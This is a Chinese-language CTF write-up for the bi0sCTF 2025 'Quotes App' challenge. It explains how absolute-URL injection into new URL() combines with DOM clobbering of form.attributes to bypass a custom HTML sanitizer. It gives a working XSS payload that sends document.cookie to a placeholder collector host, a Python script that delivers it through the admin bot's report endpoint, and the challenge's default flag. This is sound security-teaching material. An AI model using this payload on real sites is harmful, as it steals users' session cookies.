# bi0sCTF 2025 - Qoutes App 题解

## 题目简述

应用本身只提供五条固定名言，但前端会把查询参数 `quoteid` 交给 `new URL()`，再对得到的 URL 执行 `fetch()`。因此 `quoteid` 不必是 UUID，也可以是完整 URL或 `data:` URI，从而让攻击者提供任意 JSON 名言。名言虽然经过自定义 sanitizer，但其 `form.attributes` 访问可被 DOM Clobbering 覆盖，最终能在应用源内执行 JavaScript，读取管理员 Bot 预置的非 HttpOnly `flag` Cookie。

管理员源码的默认 flag 为：

```text
bi0sctf{m0m_1_th1nk_i_cl0bb3r3d_th3_DOM}
```

生产部署可以用环境变量覆盖它，因此该字符串应视为仓库默认值；实际比赛实例以回连得到的 Cookie 为准。

## 解题过程

前端 URL 构造逻辑是：

```javascript
function buildApiUrl(baseUrl, quoteId) {
  return new URL(
    quoteId,
    `${window.location.origin}${baseUrl}`
  ).toString();
}
```

当 `quoteId` 是普通 UUID 时，结果位于 `/api/quotes/<uuid>`；当它本身是绝对 URL 时，基地址会被忽略。`fetchQuote()` 随后对响应调用 `response.json()`，所以可直接提供如下数据 URI：

```text
data:application/json,{"quote":"controlled html"}
```

自定义 `sanitizeHtml()` 会遍历解析后文档中的所有元素，然后枚举属性：

```javascript
const attributeList = [].slice.call(el.attributes);
```

`HTMLFormElement` 支持按后代控件的 `id`/`name` 暴露命名属性。把 `<input id="attributes">` 放进 `<form>` 后，`form.attributes` 会被该命名控件遮蔽，`slice.call(...)` 得到空属性表，sanitizer 因而不会移除同一个 `form` 上的 `onfocus`、`autofocus` 和 `tabindex`。核心 HTML 为：

```html
<form tabindex="0" autofocus
      onfocus="location='https://<COLLECTOR>/?c='+encodeURIComponent(document.cookie)">
  <input id="attributes">
</form>
```

下面的脚本完成 JSON、`data:` URI 和外层查询参数的两次编码，并向报告接口提交目标 URL：

```python
import json
from urllib.parse import quote
from urllib.request import Request, urlopen

challenge = "http://<CHALLENGE_HOST>"
collector = "https://<COLLECTOR>/"

html = (
    '<form tabindex="0" autofocus '
    'onfocus="location=\'' + collector
    + "?c=' + encodeURIComponent(document.cookie)\">"
    '<input id="attributes"></form>'
)
data_url = "data:application/json," + quote(
    json.dumps({"quote": html}), safe=""
)
target = "http://localhost:4000/?quoteid=" + quote(data_url, safe="")

body = json.dumps({"url": target}).encode()
request = Request(
    challenge + "/report",
    data=body,
    headers={"Content-Type": "application/json"},
    method="POST",
)
print(urlopen(request).read().decode())
```

`bot.py` 在访问目标前把 `flag` Cookie 写到 `localhost`，且明确设置 `httpOnly: False`。页面加载时会自动处理 `quoteid`，表单获得焦点后跳转到接收端，查询参数中即可看到 `flag=...`。

这条链同时由当前源码和公开成功解法支持。公开解法使用外部 JSON 服务，`data:` 版本则免去了额外 CORS 服务；两者的关键均是绝对 URL 注入与 `form.attributes` clobber。原始解法链接保留作交叉核对：[CTFtime - Quotes App](https://ctftime.org/writeup/40313)。本文没有重启 Playwright Bot 进行动态回连，因此只确认了源码闭环与仓库默认 flag，没有把远端抓包冒充成本地验证。

## 方法总结

这题需要连续识别两处前端语义：`new URL(userInput, base)` 允许绝对 URL 覆盖基地址，而 HTML 表单的命名属性又能遮蔽继承来的 DOM 属性。遇到自制 sanitizer，不能只检查白名单内容，还要审计它读取的 DOM API 是否会被 clobber；遇到 Bot 题，则应同时核对 Cookie 域、HttpOnly 属性和自动触发事件，确保载荷无需人工点击。
